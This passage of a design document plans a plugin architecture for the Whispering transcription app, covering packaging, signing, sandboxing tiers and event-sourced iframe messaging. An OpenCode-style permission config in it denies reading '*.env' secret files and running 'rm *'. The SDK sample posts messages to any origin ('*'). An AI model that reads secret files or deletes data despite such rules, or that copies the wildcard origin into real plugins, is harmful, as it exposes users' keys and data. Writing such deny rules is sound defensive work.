â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        WHISPERING ECOSYSTEM                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  CORE (always installed) - @whispering/core                             â”‚
â”‚  â€¢ Recording + transcription + transformation + delivery                â”‚
â”‚  â€¢ Recent recordings widget                                             â”‚
â”‚  â€¢ ~2,000 lines                                                         â”‚
â”‚                                                                          â”‚
â”‚  SHARED (dependency) - @whispering/workspace                            â”‚
â”‚  â€¢ YJS workspace schema                                                 â”‚
â”‚  â€¢ Type definitions                                                     â”‚
â”‚  â€¢ ~200 lines                                                           â”‚
â”‚                                                                          â”‚
â”‚  OPTIONAL APPS (installable)                                            â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                          â”‚
â”‚  @whispering/recordings-manager    @whispering/recordings-mobile        â”‚
â”‚  â€¢ TanStack Table view             â€¢ Simple list view                   â”‚
â”‚  â€¢ Bulk operations, export         â€¢ Touch-friendly                     â”‚
â”‚                                                                          â”‚
â”‚  @whispering/transformations-editor                                     â”‚
â”‚  â€¢ Visual pipeline builder                                              â”‚
â”‚  â€¢ Test runner                                                          â”‚
â”‚                                                                          â”‚
â”‚  @whispering/transcription-*       @whispering/completion-*             â”‚
â”‚  â€¢ transcription-openai            â€¢ completion-anthropic               â”‚
â”‚  â€¢ transcription-groq              â€¢ completion-groq                    â”‚
â”‚  â€¢ transcription-local             â€¢ completion-local                   â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Development Experience Impact

| Aspect                         | Monolith               | Decomposed                 |
| ------------------------------ | ---------------------- | -------------------------- |
| **Working on Recordings**      | Navigate 15,000+ lines | Open ~1,500 line package   |
| **Risk of breaking unrelated** | High                   | Low                        |
| **Testing**                    | Run full app           | Run isolated app           |
| **Parallel development**       | Conflicts likely       | Independent work           |
| **Cross-cutting changes**      | Easier                 | Harder (multiple packages) |

### Verdict

| Question                    | Answer                                                                  |
| --------------------------- | ----------------------------------------------------------------------- |
| Should Whispering be split? | Partially - core workflow together, management split                    |
| Easier or harder?           | **Easier** for isolated features, **slightly harder** for cross-cutting |
| What enables the split?     | Shared workspace (`@whispering/workspace`) via YJS                      |
| What's the win?             | Optional installs, alternative UIs, community contributions             |
| What's the risk?            | Version drift, UX inconsistency, debugging complexity                   |

---

## Signing & Distribution

### Industry Signing Approaches

| Platform     | What's Signed       | Who Signs                  | Trust Model               | Transparency         |
| ------------ | ------------------- | -------------------------- | ------------------------- | -------------------- |
| **npm**      | Tarball             | Registry + CI (provenance) | Registry keys + OIDC      | Rekor log (optional) |
| **VS Code**  | Nothing             | N/A                        | Domain verification badge | None                 |
| **Chrome**   | CRX package         | Google only                | Centralized               | None                 |
| **Homebrew** | Nothing (checksums) | N/A                        | Maintainer review         | Git history          |
| **Apple**    | Binary + resources  | Developers ($99/yr)        | Certificate chain         | None                 |
| **Sigstore** | Any artifact        | Anyone with OIDC           | Identity-based            | Rekor log            |
| **GitHub**   | Artifacts           | GitHub Actions             | Repository identity       | Rekor log            |

### Recommended: jsrepo + Layered Trust

[jsrepo](https://jsrepo.dev) is a modern registry toolchain that solves distribution without npm:

- **Host anywhere**: GitHub, GitLab, self-hosted, jsrepo.com
- **Shadcn-style**: Users own the code (copy, not dependency)
- **Auto dependency resolution**: Plugins declare deps, jsrepo handles install
- **Interactive updates**: `jsrepo update` shows diffs
- **Svelte-native**: Supports folder-based components

### Distribution Flow

```
Plugin Author                    Registry                    User
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                    â”€â”€â”€â”€â”€â”€â”€â”€                    â”€â”€â”€â”€
1. Write plugin (Svelte + TS)    GitHub repo or              1. Browse plugins
2. Configure jsrepo.config.ts    jsrepo.com hosts            2. Click "Install"
3. Run `jsrepo build`            pre-compiled bundles        3. jsrepo downloads
4. Push to GitHub                                            4. Plugin loads
```

### Layered Trust Model

#### Layer 1: Integrity (Automatic)

```json
{
	"name": "transcription-groq",
	"files": [{ "path": "src/index.ts", "integrity": "sha256-abc123..." }]
}
```

- SHA-256 hash of every file
- Generated automatically by `jsrepo build`
- Verified on install

#### Layer 2: Provenance (Recommended)

Using GitHub Artifact Attestations (Sigstore-based):

```yaml
# .github/workflows/publish-registry.yml
- uses: actions/attest-build-provenance@v2
  with:
    subject-path: registry.json
```

Provides:

- Proof built from specific commit
- Proof built by GitHub Actions (not local)
- Transparency log entry in Rekor

#### Layer 3: Verified Publisher (Badge)

Like VS Code's verified publisher:

- DNS TXT record verification
- GitHub account linking
- 90+ day account age
- Results in âœ“ Verified badge

#### Layer 4: Curated Signing (Tier 3 Only)

For system plugins needing native access:

- Epicenter team signs after review
- Required for CPAL, FFmpeg, etc.

### Plugin Manifest for jsrepo

```typescript
// jsrepo.config.ts
export default defineConfig({
	registry: {
		name: '@whispering/transcription-groq',

		meta: {
			tier: 1,
			capabilities: ['network:api.groq.com', 'audio:read'],
			whisperingVersion: '>=2.0.0',
			author: { name: 'Epicenter Team', verified: true },
		},

		excludeDeps: ['svelte', '@epicenter/core'],

		items: [
			{
				name: 'transcription-groq',
				type: 'service',
				files: [{ path: 'src/index.ts' }],
				envVars: { GROQ_API_KEY: '' },
			},
		],

		outputs: [repository()],
	},
});
```

### Distribution Channels

| Channel                | Use Case               | Cost |
| ---------------------- | ---------------------- | ---- |
| `github/org/repo`      | Primary, open source   | Free |
| `jsrepo:@org/name`     | Managed hosting        | Paid |
| `https://custom.com/r` | Enterprise self-hosted | Self |
| `fs://./local`         | Development            | Free |

---

## OpenCode's Security Model

### Overview

OpenCode takes a fundamentally different approach: **trust-based with permission controls**, not sandboxed.

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    OPENCODE SECURITY MODEL                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  Plugins run with FULL ACCESS to:                                       â”‚
â”‚  â€¢ Node.js APIs (via Bun)                                               â”‚
â”‚  â€¢ File system                                                          â”‚
â”‚  â€¢ Network                                                              â”‚
â”‚  â€¢ Shell execution                                                      â”‚
â”‚                                                                          â”‚
â”‚  BUT... the LLM's USE of tools is gated by permissions                  â”‚
â”‚                                                                          â”‚
â”‚  Key insight: OpenCode doesn't sandbox plugin CODE                      â”‚
â”‚               It controls what the LLM can ASK the plugin to do         â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Permission System

```json
{
	"permission": {
		"*": "ask",

		"read": {
			"*": "allow",
			"*.env": "deny"
		},

		"bash": {
			"*": "ask",
			"git *": "allow",
			"rm *": "deny"
		},

		"edit": {
			"*": "ask",
			"*.md": "allow"
		}
	}
}
```

### Permission Actions

| Action    | Behavior                     |
| --------- | ---------------------------- |
| `"allow"` | Run without approval         |
| `"ask"`   | Prompt user, remember choice |
| `"deny"`  | Block entirely               |

### Why It Works for OpenCode

| Factor               | Rationale                         |
| -------------------- | --------------------------------- |
| User is a developer  | Can audit code, understands risks |
| Local-first          | Plugins from own machine/repo     |
| Permission prompts   | User approves dangerous actions   |
| Not handling secrets | API keys in env, not in data      |
| Code is auditable    | Plain JS/TS files                 |

### OpenCode vs. Whispering

| Aspect         | OpenCode            | Whispering                |
| -------------- | ------------------- | ------------------------- |
| **User**       | Developer           | End user (less technical) |
| **Data**       | Code (on disk)      | Audio, API keys           |
| **Source**     | npm, local          | Marketplace, community    |
| **Trust**      | User responsibility | App must protect user     |
| **Sandboxing** | None                | Required                  |

### What to Adopt from OpenCode

1. **Glob-based permission patterns**

   ```json
   { "network": { "*": "deny", "api.groq.com": "allow" } }
   ```

2. **Allow/Ask/Deny model** for user control

3. **Per-plugin permission overrides**

4. **Tool hooks for auditing**
   ```typescript
   "tool.execute.before": async (input, output) => {
     log(`Plugin ${input.tool} accessing: ${output.args}`)
   }
   ```

### What Whispering Needs Beyond OpenCode

| Need                 | OpenCode | Whispering        |
| -------------------- | -------- | ----------------- |
| Code sandboxing      | No       | Yes (Wasm/iframe) |
| API key isolation    | No       | Yes               |
| Audio access control | N/A      | Yes               |
| Marketplace trust    | No       | Yes               |
| Provenance           | No       | Yes               |

### Hybrid Model for Whispering

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚               WHISPERING HYBRID SECURITY MODEL                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  LAYER 1: Sandboxing (What plugin CAN do)                               â”‚
â”‚  â€¢ Tier 1: Wasm sandbox - no raw API access                             â”‚
â”‚  â€¢ Tier 2: iframe sandbox - no direct state access                      â”‚
â”‚  â€¢ Tier 3: Native - verified/signed only                                â”‚
â”‚                                                                          â”‚
â”‚  LAYER 2: Capabilities (What plugin DECLARES)                           â”‚
â”‚  â€¢ Manifest declares required capabilities                              â”‚
â”‚  â€¢ Runtime validates all API calls                                      â”‚
â”‚                                                                          â”‚
â”‚  LAYER 3: Permissions (What user ALLOWS) â† OpenCode-style               â”‚
â”‚  â€¢ User overrides with allow/ask/deny                                   â”‚
â”‚  â€¢ Glob patterns for fine-grained control                               â”‚
â”‚                                                                          â”‚
â”‚  LAYER 4: Trust (What ecosystem VERIFIES)                               â”‚
â”‚  â€¢ Integrity hashes, provenance, verified publishers                    â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Functional Core / Imperative Shell + Event Sourcing

### The Problem with Tier 2 (iframe) Plugins

Current challenge with ad-hoc postMessage:

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  PROBLEMS WITH AD-HOC postMessage                                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  â€¢ No type safety across iframe boundary                                â”‚
â”‚  â€¢ Imperative request/response is hard to test                          â”‚
â”‚  â€¢ State sync is manual and error-prone                                 â”‚
â”‚  â€¢ Race conditions on rapid updates                                     â”‚
â”‚  â€¢ Plugin must understand internal data shapes                          â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Functional Core / Imperative Shell Pattern

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                                                                          â”‚
â”‚  IMPERATIVE SHELL (thin)                                                â”‚
â”‚  â€¢ I/O: postMessage, fetch, Tauri commands                              â”‚
â”‚  â€¢ Side effects: clipboard, notifications, audio                        â”‚
â”‚  â€¢ Interprets commands from core                                        â”‚
â”‚                                                                          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚  FUNCTIONAL CORE (pure)                                         â”‚   â”‚
â”‚  â”‚  â€¢ State transitions: (State, Event) â†’ State                    â”‚   â”‚
â”‚  â”‚  â€¢ Command generation: (State, Intent) â†’ Command[]              â”‚   â”‚
â”‚  â”‚  â€¢ Queries: (State) â†’ View                                      â”‚   â”‚
â”‚  â”‚  â€¢ No side effects, fully testable                              â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Applied to Whispering

```typescript
// FUNCTIONAL CORE - Pure functions, no I/O

type WhisperingState = {
	recordings: Recording[];
	transformations: Transformation[];
	activeRecording: RecordingSession | null;
	settings: Settings;
};

// Events (things that happened)
type WhisperingEvent =
	| { type: 'recording.started'; deviceId: string; timestamp: number }
	| { type: 'recording.stopped'; audioBlob: Blob; duration: number }
	| { type: 'transcription.completed'; recordingId: string; text: string }
	| { type: 'recording.deleted'; recordingId: string };

// Pure reducer
function reduce(
	state: WhisperingState,
	event: WhisperingEvent,
): WhisperingState {
	switch (event.type) {
		case 'transcription.completed':
			return {
				...state,
				recordings: state.recordings.map((r) =>
					r.id === event.recordingId ? { ...r, transcript: event.text } : r,
				),
			};
		// ... etc
	}
}
```

### Event Sourcing for Plugin Communication

Instead of plugins requesting data and getting responses, **plugins subscribe to an event stream**:

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  EVENT-SOURCED PLUGIN ARCHITECTURE                                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  Host (Whispering Core)                                                 â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                  â”‚
â”‚  Event Log: [e1, e2, e3, e4, e5, ...]                                   â”‚
â”‚                    â”‚                                                     â”‚
â”‚                    â”‚ postMessage (events only)                          â”‚
â”‚                    â–¼                                                     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚  iframe (Plugin)                                                 â”‚   â”‚
â”‚  â”‚                                                                   â”‚   â”‚
â”‚  â”‚  // Plugin maintains its own state from events                   â”‚   â”‚
â”‚  â”‚  window.onmessage = ({ data: event }) => {                       â”‚   â”‚
â”‚  â”‚    state = reducer(state, event);                                â”‚   â”‚
â”‚  â”‚    render(state);                                                â”‚   â”‚
â”‚  â”‚  };                                                              â”‚   â”‚
â”‚  â”‚                                                                   â”‚   â”‚
â”‚  â”‚  // To take action, plugin sends intents                         â”‚   â”‚
â”‚  â”‚  parent.postMessage({ intent: 'deleteRecording', id: '123' });   â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Benefits for Tier 2 Plugins

| Benefit         | How It Helps                                 |
| --------------- | -------------------------------------------- |
| **Type safety** | Events are a defined contract                |
| **Testability** | Replay events to test plugin state           |
| **Time travel** | Plugin can request historical events on load |
| **Consistency** | All plugins see same events in same order    |
| **Decoupling**  | Plugins don't know about internal services   |
| **Debugging**   | Event log is complete audit trail            |

### Bidirectional Communication Protocol

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    HYBRID COMMUNICATION MODEL                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  DOWNSTREAM (Host â†’ Plugin)                                             â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                             â”‚
â”‚  1. Events (push)       - State changes, filtered by capability         â”‚
â”‚  2. Snapshots (push)    - Initial state on plugin load                  â”‚
â”‚  3. Acks (response)     - Intent accepted/rejected                      â”‚
â”‚  4. Query responses     - Data requested by plugin                      â”‚
â”‚                                                                          â”‚
â”‚  UPSTREAM (Plugin â†’ Host)                                               â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                               â”‚
â”‚  1. Intents             - "I want X to happen" (validated by host)      â”‚
â”‚  2. Queries             - "Give me data matching X" (read-only)         â”‚
â”‚  3. Subscriptions       - "I want to hear about X" (filter events)      â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Message Types

```typescript
// HOST â†’ PLUGIN
type HostToPluginMessage =
	| { type: 'snapshot'; state: PluginVisibleState }
	| { type: 'event'; event: WhisperingEvent }
	| {
			type: 'ack';
			correlationId: string;
			status: 'accepted' | 'rejected';
			error?: string;
	  }
	| { type: 'queryResponse'; correlationId: string; data: unknown };

// PLUGIN â†’ HOST
type PluginToHostMessage =
	| { type: 'intent'; correlationId: string; intent: WhisperingIntent }
	| { type: 'query'; correlationId: string; query: WhisperingQuery }
	| { type: 'subscribe'; topics: string[] }
	| { type: 'ready' };
```

### Intent Types (Plugin wants to DO something)

```typescript
type WhisperingIntent =
	| { type: 'recording.delete'; id: string }
	| { type: 'recording.rename'; id: string; title: string }
	| { type: 'recording.retranscribe'; id: string; service?: string }
	| { type: 'playback.start'; recordingId: string }
	| { type: 'playback.stop' }
	| { type: 'clipboard.write'; text: string }
	| { type: 'navigate'; path: string };
```

### Query Types (Plugin wants to READ something)

```typescript
type WhisperingQuery =
	| { type: 'recordings.list'; filter?: RecordingFilter; limit?: number }
	| { type: 'recordings.search'; query: string; limit?: number }
	| { type: 'transformations.list' }
	| { type: 'settings.get'; keys: string[] };
```

### Security with Event Sourcing

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  SECURITY MODEL                                                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  Events (Host â†’ Plugin)                                                 â”‚
â”‚  â€¢ Host FILTERS events based on plugin capabilities                     â”‚
â”‚  â€¢ Plugin with 'recordings:read' gets recording events                  â”‚
â”‚  â€¢ Plugin without 'settings:read' never sees settings events            â”‚
â”‚                                                                          â”‚
â”‚  Intents (Plugin â†’ Host)                                                â”‚
â”‚  â€¢ Host VALIDATES capability before executing                           â”‚
â”‚  â€¢ Host VALIDATES intent data (is recording ID real?)                   â”‚
â”‚  â€¢ Plugin NEVER executes directly                                       â”‚
â”‚                                                                          â”‚
â”‚  Result: Plugin is purely reactive                                      â”‚
â”‚  â€¢ Receives filtered event stream                                       â”‚
â”‚  â€¢ Can only request actions via validated intents                       â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### YJS Integration

YJS is already event-sourced under the hood:

```typescript
// Host bridges YJS updates to plugin events
workspace.recordings.observe((event) => {
	for (const change of event.changes.added) {
		sendToPlugin({ type: 'recording.created', recording: change });
	}
	for (const change of event.changes.deleted) {
		sendToPlugin({ type: 'recording.deleted', id: change.id });
	}
});
```

### Plugin SDK

```typescript
// @whispering/plugin-sdk

class WhisperingBridge {
  constructor(reducer: (state: State, event: Event) => State) {
    window.addEventListener('message', (e) => {
      if (e.data.type === 'event') {
        this.state = reducer(this.state, e.data.event);
        this.notify();
      }
    });
  }

  // Send intent (fire and wait for ack)
  async sendIntent(intent: WhisperingIntent): Promise<void> {
    const correlationId = crypto.randomUUID();
    parent.postMessage({ type: 'intent', correlationId, intent }, '*');
    return this.waitForAck(correlationId);
  }

  // Query data (request/response)
  async query<T>(query: WhisperingQuery): Promise<T> {
    const correlationId = crypto.randomUUID();
    parent.postMessage({ type: 'query', correlationId, query }, '*');
    return this.waitForResponse(correlationId);
  }

  // Subscribe to state changes
  subscribe(fn: (state: State) => void): () => void { ... }
}
```

### Communication Patterns Summary

| Direction         | Mechanism  | Use Case      | Response             |
| ----------------- | ---------- | ------------- | -------------------- |
| **Host â†’ Plugin** | Event push | State changes | N/A                  |
| **Host â†’ Plugin** | Snapshot   | Initial load  | N/A                  |
| **Plugin â†’ Host** | Intent     | Modify state  | Ack + eventual event |
| **Plugin â†’ Host** | Query      | Read data     | Query response       |

---

## Actor Model for Multi-Core Parallelism

### Relationship to Functional Core / Imperative Shell

FC/IS and Actor Model are **complementary patterns** that work at different scopes:

| Concept              | Scope              | Purpose                |
| -------------------- | ------------------ | ---------------------- |
| **Functional Core**  | Within a component | Testable state logic   |
| **Imperative Shell** | Within a component | I/O and side effects   |
| **Actor Model**      | Between components | Multi-core parallelism |

You can (and often should) use both:

- Each **actor** has its own **functional core** for state
- The **imperative shell** handles message passing between actors

### What Is the Actor Model?
